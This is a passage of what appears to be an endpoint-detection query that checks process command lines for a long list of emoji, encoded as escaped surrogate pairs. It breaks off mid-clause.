tgt.process.cmdline contains \"\ud83c\udf63\" or tgt.process.cmdline contains \"\ud83c\udf71\" or tgt.process.cmdline contains \"\ud83e\udd5f\" or tgt.process.cmdline contains \"\ud83e\uddaa\" or tgt.process.cmdline contains \"\ud83c\udf64\" or tgt.process.cmdline contains \"\ud83c\udf59\" or tgt.process.cmdline contains \"\ud83c\udf5a\" or tgt.process.cmdline contains \"\ud83c\udf58\" or tgt.process.cmdline contains \"\ud83c\udf65\" or tgt.process.cmdline contains \"\ud83e\udd60\" or tgt.process.cmdline contains \"\ud83e\udd6e\" or tgt.process.cmdline contains \"\ud83c\udf62\" or tgt.process.cmdline contains \"\ud83c\udf61\" or tgt.process.cmdline contains \"\ud83c\udf67\" or tgt.process.cmdline contains \"\ud83c\udf68\" or tgt.process.cmdline contains \"\ud83c\udf66\" or tgt.process.cmdline contains \"\ud83e\udd67\" or tgt.process.cmdline contains \"\ud83e\uddc1\" or tgt.process.cmdline contains \"\ud83c\udf70\" or tgt.process.cmdline contains \"\ud83c\udf82\" or tgt.process.cmdline contains \"\ud83c\udf6e\" or tgt.process.cmdline contains \"\ud83c\udf6d\" or tgt.process.cmdline contains \"\ud83c\udf6c\" or tgt.process.cmdline contains \"\ud83c\udf6b\" or tgt.process.cmdline contains \"\ud83c\udf7f\" or tgt.process.cmdline contains \"\ud83c\udf69\" or tgt.process.cmdline contains \"\ud83c\udf6a\" or tgt.process.cmdline contains \"\ud83c\udf30\" or tgt.process.cmdline contains \"\ud83e\udd5c\" or tgt.process.cmdline contains \"\ud83c\udf6f\" or tgt.process.cmdline contains \"\ud83e\udd5b\" or tgt.process.cmdline contains \"\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uded6\" or tgt.process.cmdline contains \"\u2615\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf75\" or tgt.process.cmdline contains \"\ud83e\uddc3\" or tgt.process.cmdline contains \"\ud83e\udd64\" or tgt.process.cmdline contains \"\ud83e\uddcb\" or tgt.process.cmdline contains \"\ud83e\uded9\" or tgt.process.cmdline contains \"\ud83c\udf76\" or tgt.process.cmdline contains \"\ud83c\udf7a\" or tgt.process.cmdline contains \"\ud83c\udf7b\" or tgt.process.cmdline contains \"\ud83e\udd42\" or tgt.process.cmdline contains \"\ud83c\udf77\" or tgt.process.cmdline contains \"\ud83e\uded7\" or tgt.process.cmdline contains \"\ud83e\udd43\" or tgt.process.cmdline contains \"\ud83c\udf78\" or tgt.process.cmdline contains \"\ud83c\udf79\" or tgt.process.cmdline contains \"\ud83e\uddc9\" or tgt.process.cmdline contains \"\ud83c\udf7e\" or tgt.process.cmdline contains \"\ud83e\uddca\" or tgt.process.cmdline contains \"\ud83e\udd44\" or tgt.process.cmdline contains \"\ud83c\udf74\" or tgt.process.cmdline contains \"\ud83c\udf7d\" or tgt.process.cmdline contains \"\ud83e\udd63\" or tgt.process.cmdline contains \"\ud83e\udd61\" or tgt.process.cmdline contains \"\ud83e\udd62\" or tgt.process.cmdline contains \"\ud83e\uddc2\" or tgt.process.cmdline contains \"\u26bd\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc0\" or tgt.process.cmdline contains \"\ud83c\udfc8\" or tgt.process.cmdline contains \"\u26be\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd4e\" or tgt.process.cmdline contains \"\ud83c\udfbe\" or tgt.process.cmdline contains \"\ud83c\udfd0\" or tgt.process.cmdline contains \"\ud83c\udfc9\" or tgt.process.cmdline contains \"\ud83e\udd4f\" or tgt.process.cmdline contains \"\ud83c\udfb1\" or tgt.process.cmdline contains \"\ud83e\ude80\" or tgt.process.cmdline contains \"\ud83c\udfd3\" or tgt.process.cmdline contains \"\ud83c\udff8\" or tgt.process.cmdline contains \"\ud83c\udfd2\" or tgt.process.cmdline contains \"\ud83c\udfd1\" or tgt.process.cmdline contains \"\ud83e\udd4d\" or tgt.process.cmdline contains \"\ud83c\udfcf\" or tgt.process.cmdline contains \"\ud83e\ude83\" or tgt.process.cmdline contains \"\ud83e\udd45\" or tgt.process.cmdline contains \"\u26f3\ufe0f\" or tgt.process.cmdline contains \"\ud83e\ude81\" or tgt.process.cmdline contains \"\ud83c\udff9\" or tgt.process.cmdline contains \"\ud83c\udfa3\" or tgt.process.cmdline contains \"\ud83e\udd3f\" or tgt.process.cmdline contains \"\ud83e\udd4a\" or tgt.process.cmdline contains \"\ud83e\udd4b\" or tgt.process.cmdline contains \"\ud83c\udfbd\" or tgt.process.cmdline contains \"\ud83d\udef9\" or tgt.process.cmdline contains \"\ud83d\udefc\" or tgt.process.cmdline contains \"\ud83d\udef7\" or tgt.process.cmdline contains \"\u26f8\" or tgt.process.cmdline contains \"\ud83e\udd4c\" or tgt.process.cmdline contains \"\ud83c\udfbf\" or tgt.process.cmdline contains \"\u26f7\" or tgt.process.cmdline contains \"\ud83c\udfc2\" or tgt.process.cmdline contains \"\ud83e\ude82\" or tgt.process.cmdline contains \"\ud83c\udfcb\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3c\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3c\" or tgt.process.cmdline contains \"\ud83e\udd3c\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\" or tgt.process.cmdline contains \"\ud83e\udd38\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3a\" or tgt.process.cmdline contains \"\ud83e\udd3e\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\" or tgt.process.cmdline contains \"\ud83e\udd3e\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\" or tgt.process.cmdline contains \"\ud83e\uddd8\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\" or tgt.process.cmdline contains \"\ud83e\uddd8\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\" or tgt.process.cmdline contains \"\ud83c\udfc4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\" or tgt.process.cmdline contains \"\ud83c\udfca\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\" or tgt.process.cmdline contains \"\ud83e\udd3d\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\" or tgt.process.cmdline contains \"\ud83d\udea3\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\" or tgt.process.cmdline contains \"\ud83e\uddd7\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\" or tgt.process.cmdline contains \"\ud83d\udeb5\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\" or tgt.process.cmdline contains \"\ud83d\udeb4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc6\" or tgt.process.cmdline contains \"\ud83e\udd47\" or tgt.process.cmdline contains \"\ud83e\udd48\" or tgt.process.cmdline contains \"\ud83e\udd49\" or tgt.process.cmdline contains \"\ud83c\udfc5\" or tgt.process.cmdline contains \"\ud83c\udf96\" or tgt.process.cmdline contains \"\ud83c\udff5\" or tgt.process.cmdline contains \"\ud83c\udf97\" or tgt.process.cmdline contains \"\ud83c\udfab\" or tgt.process.cmdline contains \"\ud83c\udf9f\" or tgt.process.cmdline contains \"\ud83c\udfaa\" or tgt.process.cmdline contains \"\ud83e\udd39\" or tgt.process.cmdline contains \"\ud83e\udd39\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfad\" or tgt.process.cmdline contains \"\ud83e\ude70\" or tgt.process.cmdline contains \"\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83c\udfac\" or tgt.process.cmdline contains \"\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83c\udfa7\" or tgt.process.cmdline contains \"\ud83c\udfbc\" or tgt.process.cmdline contains \"\ud83c\udfb9\" or tgt.process.cmdline contains \"\ud83e\udd41\" or tgt.process.cmdline contains \"\ud83e\ude98\" or tgt.process.cmdline contains \"\ud83c\udfb7\" or tgt.process.cmdline contains \"\ud83c\udfba\" or tgt.process.cmdline contains \"\ud83e\ude97\" or tgt.process.cmdline contains \"\ud83c\udfb8\" or tgt.process.cmdline contains \"\ud83e\ude95\" or tgt.process.cmdline contains \"\ud83c\udfbb\" or tgt.process.cmdline contains \"\ud83c\udfb2\" or tgt.process.cmdline contains \"\u265f\" or tgt.process.cmdline contains \"\ud83c\udfaf\" or tgt.process.cmdline contains \"\ud83c\udfb3\" or tgt.process.cmdline contains \"\ud83c\udfae\" or tgt.process.cmdline contains \"\ud83c\udfb0\" or tgt.process.cmdline contains \"\ud83e\udde9\" or tgt.process.cmdline contains \"\ud83d\ude97\" or tgt.process.cmdline contains \"\ud83d\ude95\" or tgt.process.cmdline contains \"\ud83d\ude99\" or tgt.process.cmdline contains \"\ud83d\ude8c\" or tgt.process.cmdline contains \"\ud83d\ude8e\" or tgt.process.cmdline contains \"\ud83c\udfce\" or tgt.process.cmdline contains \"\ud83d\ude93\" or tgt.process.cmdline contains \"\ud83d\ude91\" or tgt.process.cmdline contains \"\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\ude90\" or tgt.process.cmdline contains \"\ud83d\udefb\" or tgt.process.cmdline contains \"\ud83d\ude9a\" or tgt.process.cmdline contains \"\ud83d\ude9b\" or tgt.process.cmdline contains \"\ud83d\ude9c\" or tgt.process.cmdline contains \"\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udef4\" or tgt.process.cmdline contains \"\ud83d\udeb2\" or tgt.process.cmdline contains \"\ud83d\udef5\" or tgt.process.cmdline contains \"\ud83c\udfcd\" or tgt.process.cmdline contains \"\ud83d\udefa\" or tgt.process.cmdline contains \"\ud83d\udea8\" or tgt.process.cmdline contains \"\ud83d\ude94\" or tgt.process.cmdline contains \"\ud83d\ude8d\" or tgt.process.cmdline contains \"\ud83d\ude98\" or tgt.process.cmdline contains \"\ud83d\ude96\" or tgt.process.cmdline contains \"\ud83d\udede\" or tgt.process.cmdline contains \"\ud83d\udea1\" or tgt.process.cmdline contains \"\ud83d\udea0\" or tgt.process.cmdline contains \"\ud83d\ude9f\" or tgt.process.cmdline contains \"\ud83d\ude83\" or tgt.process.cmdline contains \"\ud83d\ude8b\" or tgt.process.cmdline contains \"\ud83d\ude9e\" or tgt.process.cmdline contains \"\ud83d\ude9d\" or tgt.process.cmdline contains \"\ud83d\ude84\" or tgt.process.cmdline contains \"\ud83d\ude85\" or tgt.process.cmdline contains \"\ud83d\ude88\" or tgt.process.cmdline contains \"\ud83d\ude82\" or tgt.process.cmdline contains \"\ud83d\ude86\" or tgt.process.cmdline contains \"\ud83d\ude87\" or tgt.process.cmdline contains \"\ud83d\ude8a\" or tgt.process.cmdline contains \"\ud83d\ude89\" or tgt.process.cmdline contains \"\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeeb\" or tgt.process.cmdline contains \"\ud83d\udeec\" or tgt.process.cmdline contains \"\ud83d\udee9\" or tgt.process.cmdline contains \"\ud83d\udcba\" or tgt.process.cmdline contains \"\ud83d\udef0\" or tgt.process.cmdline contains \"\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udef8\" or tgt.process.cmdline contains \"\ud83d\ude81\" or tgt.process.cmdline contains \"\ud83d\udef6\" or tgt.process.cmdline contains \"\u26f5\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea4\" or tgt.process.cmdline contains \"\ud83d\udee5\" or tgt.process.cmdline contains \"\ud83d\udef3\" or tgt.process.cmdline contains \"\u26f4\" or tgt.process.cmdline contains \"\ud83d\udea2\" or tgt.process.cmdline contains \"\u2693\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udedf\" or tgt.process.cmdline contains \"\ud83e\ude9d\" or tgt.process.cmdline contains \"\u26fd\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea7\" or tgt.process.cmdline contains \"\ud83d\udea6\" or tgt.process.cmdline contains \"\ud83d\udea5\" or tgt.process.cmdline contains \"\ud83d\ude8f\" or tgt.process.cmdline contains \"\ud83d\uddfa\" or tgt.process.cmdline contains \"\ud83d\uddff\" or tgt.process.cmdline contains \"\ud83d\uddfd\" or tgt.process.cmdline contains \"\ud83d\uddfc\" or tgt.process.cmdline contains \"\ud83c\udff0\" or tgt.process.cmdline contains \"\ud83c\udfef\" or tgt.process.cmdline contains \"\ud83c\udfdf\" or tgt.process.cmdline contains \"\ud83c\udfa1\" or tgt.process.cmdline contains \"\ud83c\udfa2\" or tgt.process.cmdline contains \"\ud83d\udedd\" or tgt.process.cmdline contains \"\ud83c\udfa0\" or tgt.process.cmdline contains \"\u26f2\ufe0f\" or tgt.process.cmdline contains \"\u26f1\" or tgt.process.cmdline contains \"\ud83c\udfd6\" or tgt.process.cmdline contains \"\ud83c\udfdd\" or tgt.process.cmdline contains \"\ud83c\udfdc\" or tgt.process.cmdline contains \"\ud83c\udf0b\" or tgt.process.cmdline contains \"\u26f0\" or tgt.process.cmdline contains \"\ud83c\udfd4\" or tgt.process.cmdline contains \"\ud83d\uddfb\" or tgt.process.cmdline contains \"\ud83c\udfd5\" or tgt.process.cmdline contains \"\u26fa\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded6\" or tgt.process.cmdline contains \"\ud83c\udfe0\" or tgt.process.cmdline contains \"\ud83c\udfe1\" or tgt.process.cmdline contains \"\ud83c\udfd8\" or tgt.process.cmdline contains \"\ud83c\udfda\" or tgt.process.cmdline contains \"\ud83c\udfd7\" or tgt.process.cmdline contains \"\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83c\udfe2\" or tgt.process.cmdline contains \"\ud83c\udfec\" or tgt.process.cmdline contains \"\ud83c\udfe3\" or tgt.process.cmdline contains \"\ud83c\udfe4\" or tgt.process.cmdline contains \"\ud83c\udfe5\" or tgt.process.cmdline contains \"\ud83c\udfe6\" or tgt.process.cmdline contains \"\ud83c\udfe8\" or tgt.process.cmdline contains \"\ud83c\udfea\" or tgt.process.cmdline contains \"\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83c\udfe9\" or tgt.process.cmdline contains \"\ud83d\udc92\" or tgt.process.cmdline contains \"\ud83c\udfdb\" or tgt.process.cmdline contains \"\u26ea\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd4c\" or tgt.process.cmdline contains \"\ud83d\udd4d\" or tgt.process.cmdline contains \"\ud83d\uded5\" or tgt.process.cmdline contains \"\ud83d\udd4b\" or tgt.process.cmdline contains \"\u26e9\" or tgt.process.cmdline contains \"\ud83d\udee4\" or tgt.process.cmdline contains \"\ud83d\udee3\" or tgt.process.cmdline contains \"\ud83d\uddfe\" or tgt.process.cmdline contains \"\ud83c\udf91\" or tgt.process.cmdline contains \"\ud83c\udfde\" or tgt.process.cmdline contains \"\ud83c\udf05\" or tgt.process.cmdline contains \"\ud83c\udf04\" or tgt.process.cmdline contains \"\ud83c\udf20\" or tgt.process.cmdline contains \"\ud83c\udf87\" or tgt.process.cmdline contains \"\ud83c\udf86\" or tgt.process.cmdline contains \"\ud83c\udf07\" or tgt.process.cmdline contains \"\ud83c\udf06\" or tgt.process.cmdline contains \"\ud83c\udfd9\" or tgt.process.cmdline contains \"\ud83c\udf03\" or tgt.process.cmdline contains \"\ud83c\udf0c\" or tgt.process.cmdline contains \"\ud83c\udf09\" or tgt.process.cmdline contains \"\ud83c\udf01\" or tgt.process.cmdline contains \"\u231a\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcf1\" or tgt.process.cmdline contains \"\ud83d\udcf2\" or tgt.process.cmdline contains \"\ud83d\udcbb\" or tgt.process.cmdline contains \"\u2328\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udda5\" or tgt.process.cmdline contains \"\ud83d\udda8\" or tgt.process.cmdline contains \"\ud83d\uddb1\" or tgt.process.cmdline contains \"\ud83d\uddb2\" or tgt.process.cmdline contains \"\ud83d\udd79\" or tgt.process.cmdline contains \"\ud83d\udddc\" or tgt.process.cmdline contains \"\ud83d\udcbd\" or tgt.process.cmdline contains \"\ud83d\udcbe\" or tgt.process.cmdline contains \"\ud83d\udcbf\" or tgt.process.cmdline contains \"\ud83d\udcc0\" or tgt.process.cmdline contains \"\ud83d\udcfc\" or tgt.process.cmdline contains \"\ud83d\udcf7\" or tgt.process.cmdline contains \"\ud83d\udcf8\" or tgt.process.cmdline contains \"\ud83d\udcf9\" or tgt.process.cmdline contains \"\ud83c\udfa5\" or tgt.process.cmdline contains \"\ud83d\udcfd\" or tgt.process.cmdline contains \"\ud83c\udf9e\" or tgt.process.cmdline contains \"\ud83d\udcde\" or tgt.process.cmdline contains \"\u260e\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcdf\" or tgt.process.cmdline contains \"\ud83d\udce0\" or tgt.process.cmdline contains \"\ud83d\udcfa\" or tgt.process.cmdline contains \"\ud83d\udcfb\" or tgt.process.cmdline contains \"\ud83c\udf99\" or tgt.process.cmdline contains \"\ud83c\udf9a\" or tgt.process.cmdline contains \"\ud83c\udf9b\" or tgt.process.cmdline contains \"\ud83e\udded\" or tgt.process.cmdline contains \"\u23f1\" or tgt.process.cmdline contains \"\u23f2\" or tgt.process.cmdline contains \"\u23f0\" or tgt.process.cmdline contains \"\ud83d\udd70\" or tgt.process.cmdline contains \"\u231b\ufe0f\" or tgt.process.cmdline contains \"\u23f3\" or tgt.process.cmdline contains \"\ud83d\udce1\" or tgt.process.cmdline contains \"\ud83d\udd0b\" or tgt.process.cmdline contains \"\ud83e\udeab\" or tgt.process.cmdline contains \"\ud83d\udd0c\" or tgt.process.cmdline contains \"\ud83d\udca1\" or tgt.process.cmdline contains \"\ud83d\udd26\" or tgt.process.cmdline contains \"\ud83d\udd6f\" or tgt.process.cmdline contains \"\ud83e\ude94\" or tgt.process.cmdline contains \"\ud83e\uddef\" or tgt.process.cmdline contains \"\ud83d\udee2\" or tgt.process.cmdline contains \"\ud83d\udcb8\" or tgt.process.cmdline contains \"\ud83d\udcb5\" or tgt.process.cmdline contains \"\ud83d\udcb4\" or tgt.process.cmdline contains \"\ud83d\udcb6\" or tgt.process.cmdline contains \"\ud83d\udcb7\" or tgt.process.cmdline contains \"\ud83e\ude99\" or tgt.process.cmdline contains \"\ud83d\udcb0\" or tgt.process.cmdline contains \"\ud83d\udcb3\" or tgt.process.cmdline contains \"\ud83d\udc8e\" or tgt.process.cmdline contains \"\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\ude9c\" or tgt.process.cmdline contains \"\ud83e\uddf0\" or tgt.process.cmdline contains \"\ud83e\ude9b\" or tgt.process.cmdline contains \"\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udd28\" or tgt.process.cmdline contains \"\u2692\" or tgt.process.cmdline contains \"\ud83d\udee0\" or tgt.process.cmdline contains \"\u26cf\" or tgt.process.cmdline contains \"\ud83e\ude9a\" or tgt.process.cmdline contains \"\ud83d\udd29\" or tgt.process.cmdline contains \"\u2699\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udea4\" or tgt.process.cmdline contains \"\ud83e\uddf1\" or tgt.process.cmdline contains \"\u26d3\" or tgt.process.cmdline contains \"\ud83e\uddf2\" or tgt.process.cmdline contains \"\ud83d\udd2b\" or tgt.process.cmdline contains \"\ud83d\udca3\" or tgt.process.cmdline contains \"\ud83e\udde8\" or tgt.process.cmdline contains \"\ud83e\ude93\" or tgt.process.cmdline contains \"\ud83d\udd2a\" or tgt.process.cmdline contains \"\ud83d\udde1\" or tgt.process.cmdline contains \"\u2694\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udee1\" or tgt.process.cmdline contains \"\ud83d\udeac\" or tgt.process.cmdline contains \"\u26b0\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udea6\" or tgt.process.cmdline contains \"\u26b1\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udffa\" or tgt.process.cmdline contains \"\ud83d\udd2e\" or tgt.process.cmdline contains \"\ud83d\udcff\" or tgt.process.cmdline contains \"\ud83e\uddff\" or tgt.process.cmdline contains \"\ud83e\udeac\" or tgt.process.cmdline contains \"\ud83d\udc88\" or tgt.process.cmdline contains \"\u2697\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd2d\" or tgt.process.cmdline contains \"\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udd73\" or tgt.process.cmdline contains \"\ud83e\ude79\" or tgt.process.cmdline contains \"\ud83e\ude7a\" or tgt.process.cmdline contains \"\ud83e\ude7b\" or tgt.process.cmdline contains \"\ud83e\ude7c\" or tgt.process.cmdline contains \"\ud83d\udc8a\" or tgt.process.cmdline contains \"\ud83d\udc89\" or tgt.process.cmdline contains \"\ud83e\ude78\" or tgt.process.cmdline contains \"\ud83e\uddec\" or tgt.process.cmdline contains \"\ud83e\udda0\" or tgt.process.cmdline contains \"\ud83e\uddeb\" or tgt.process.cmdline contains \"\ud83e\uddea\" or tgt.process.cmdline contains \"\ud83c\udf21\" or tgt.process.cmdline contains \"\ud83e\uddf9\" or tgt.process.cmdline contains \"\ud83e\udea0\" or tgt.process.cmdline contains \"\ud83e\uddfa\" or tgt.process.cmdline contains \"\ud83e\uddfb\" or tgt.process.cmdline contains \"\ud83d\udebd\" or tgt.process.cmdline contains \"\ud83d\udeb0\" or tgt.process.cmdline contains \"\ud83d\udebf\" or tgt.process.cmdline contains \"\ud83d\udec1\" or tgt.process.cmdline contains \"\ud83d\udec0\" or tgt.process.cmdline contains \"\ud83e\uddfc\" or tgt.process.cmdline contains \"\ud83e\udea5\" or tgt.process.cmdline contains \"\ud83e\ude92\" or tgt.process.cmdline contains \"\ud83e\uddfd\" or tgt.process.cmdline contains \"\ud83e\udea3\" or tgt.process.cmdline contains \"\ud83e\uddf4\" or tgt.process.cmdline contains \"\ud83d\udece\" or tgt.process.cmdline contains \"\ud83d\udd11\" or tgt.process.cmdline contains \"\ud83d\udddd\" or tgt.process.cmdline contains \"\ud83d\udeaa\" or tgt.process.cmdline contains \"\ud83e\ude91\" or tgt.process.cmdline contains \"\ud83d\udecb\" or tgt.process.cmdline contains \"\ud83d\udecf\" or tgt.process.cmdline contains \"\ud83d\udecc\" or tgt.process.cmdline contains \"\ud83e\uddf8\" or tgt.process.cmdline contains \"\ud83e\ude86\" or tgt.process.cmdline contains \"\ud83d\uddbc\" or tgt.process.cmdline contains \"\ud83e\ude9e\" or tgt.process.cmdline contains \"\ud83e\ude9f\" or tgt.process.cmdline contains \"\ud83d\udecd\" or tgt.process.cmdline contains \"\ud83d\uded2\" or tgt.process.cmdline contains \"\ud83c\udf81\" or tgt.process.cmdline contains \"\ud83c\udf88\" or tgt.process.cmdline contains \"\ud83c\udf8f\" or tgt.process.cmdline contains \"\ud83c\udf80\" or tgt.process.cmdline contains \"\ud83e\ude84\" or tgt.process.cmdline contains \"\ud83e\ude85\" or tgt.process.cmdline contains \"\ud83c\udf8a\" or tgt.process.cmdline contains \"\ud83c\udf89\" or tgt.process.cmdline contains \"\ud83e\udea9\" or tgt.process.cmdline contains \"\ud83c\udf8e\" or tgt.process.cmdline contains \"\ud83c\udfee\" or tgt.process.cmdline contains \"\ud83c\udf90\" or tgt.process.cmdline contains \"\ud83e\udde7\" or tgt.process.cmdline contains \"\u2709\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udce9\" or tgt.process.cmdline contains \"\ud83d\udce8\" or tgt.process.cmdline contains \"\ud83d\udce7\" or tgt.process.cmdline contains \"\ud83d\udc8c\" or tgt.process.cmdline contains \"\ud83d\udce5\" or tgt.process.cmdline contains \"\ud83d\udce4\" or tgt.process.cmdline contains \"\ud83d\udce6\" or tgt.process.cmdline contains \"\ud83c\udff7\" or tgt.process.cmdline contains \"\ud83e\udea7\" or tgt.process.cmdline contains \"\ud83d\udcea\" or tgt.process.cmdline contains \"\ud83d\udceb\" or tgt.process.cmdline contains \"\ud83d\udcec\" or tgt.process.cmdline contains \"\ud83d\udced\" or tgt.process.cmdline contains \"\ud83d\udcee\" or tgt.process.cmdline contains \"\ud83d\udcef\" or tgt.process.cmdline contains \"\ud83d\udcdc\" or tgt.process.cmdline contains \"\ud83d\udcc3\" or tgt.process.cmdline contains \"\ud83d\udcc4\" or tgt.process.cmdline contains \"\ud83d\udcd1\" or tgt.process.cmdline contains \"\ud83e\uddfe\" or tgt.process.cmdline contains \"\ud83d\udcca\" or tgt.process.cmdline contains \"\ud83d\udcc8\" or tgt.process.cmdline contains \"\ud83d\udcc9\" or tgt.process.cmdline contains \"\ud83d\uddd2\" or tgt.process.cmdline contains \"\ud83d\uddd3\" or tgt.process.cmdline contains \"\ud83d\udcc6\" or tgt.process.cmdline contains \"\ud83d\udcc5\" or tgt.process.cmdline contains \"\ud83d\uddd1\" or tgt.process.cmdline contains \"\ud83e\udeaa\" or tgt.process.cmdline contains \"\ud83d\udcc7\" or tgt.process.cmdline contains \"\ud83d\uddc3\" or tgt.process.cmdline contains \"\ud83d\uddf3\" or tgt.process.cmdline contains \"\ud83d\uddc4\" or tgt.process.cmdline contains \"\ud83d\udccb\" or tgt.process.cmdline contains \"\ud83d\udcc1\" or tgt.process.cmdline contains \"\ud83d\udcc2\" or tgt.process.cmdline contains \"\ud83d\uddc2\" or tgt.process.cmdline contains \"\ud83d\uddde\" or tgt.process.cmdline contains \"\ud83d\udcf0\" or tgt.process.cmdline contains \"\ud83d\udcd3\" or tgt.process.cmdline contains \"\ud83d\udcd4\" or tgt.process.cmdline contains \"\ud83d\udcd2\" or tgt.process.cmdline contains \"\ud83d\udcd5\" or tgt.process.cmdline contains \"\ud83d\udcd7\" or tgt.process.cmdline contains \"\ud83d\udcd8\" or tgt.process.cmdline contains \"\ud83d\udcd9\" or tgt.process.cmdline contains \"\ud83d\udcda\" or tgt.process.cmdline contains \"\ud83d\udcd6\" or tgt.process.cmdline contains \"\ud83d\udd16\" or tgt.process.cmdline contains \"\ud83e\uddf7\" or tgt.process.cmdline contains \"\ud83d\udd17\" or tgt.process.cmdline contains \"\ud83d\udcce\" or tgt.process.cmdline contains \"\ud83d\udd87\" or tgt.process.cmdline contains \"\ud83d\udcd0\" or tgt.process.cmdline contains \"\ud83d\udccf\" or tgt.process.cmdline contains \"\ud83e\uddee\" or tgt.process.cmdline contains \"\ud83d\udccc\" or tgt.process.cmdline contains \"\ud83d\udccd\" or tgt.process.cmdline contains \"\u2702\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd8a\" or tgt.process.cmdline contains \"\ud83d\udd8b\" or tgt.process.cmdline contains \"\u2712\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd8c\" or tgt.process.cmdline contains \"\ud83d\udd8d\" or tgt.process.cmdline contains \"\ud83d\udcdd\" or tgt.process.cmdline contains \"\u270f\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd0d\" or tgt.process.cmdline contains \"\ud83d\udd0e\" or tgt.process.cmdline contains \"\ud83d\udd0f\" or tgt.process.cmdline contains \"\ud83d\udd10\" or tgt.process.cmdline contains \"\ud83d\udd12\" or tgt.process.cmdline contains \"\ud83d\udd13\u2764\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udde1\" or tgt.process.cmdline contains \"\ud83d\udc9b\" or tgt.process.cmdline contains \"\ud83d\udc9a\" or tgt.process.cmdline contains \"\ud83d\udc99\" or tgt.process.cmdline contains \"\ud83d\udc9c\" or tgt.process.cmdline contains \"\ud83d\udda4\" or tgt.process.cmdline contains \"\ud83e\udd0d\" or tgt.process.cmdline contains \"\ud83e\udd0e\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83d\udd25\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83e\ude79\" or tgt.process.cmdline contains \"\ud83d\udc94\" or tgt.process.cmdline contains \"\u2763\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc95\" or tgt.process.cmdline contains \"\ud83d\udc9e\" or tgt.process.cmdline contains \"\ud83d\udc93\" or tgt.process.cmdline contains \"\ud83d\udc97\" or tgt.process.cmdline contains \"\ud83d\udc96\" or tgt.process.cmdline contains \"\ud83d\udc98\" or tgt.process.cmdline contains \"\ud83d\udc9d\" or tgt.process.cmdline contains 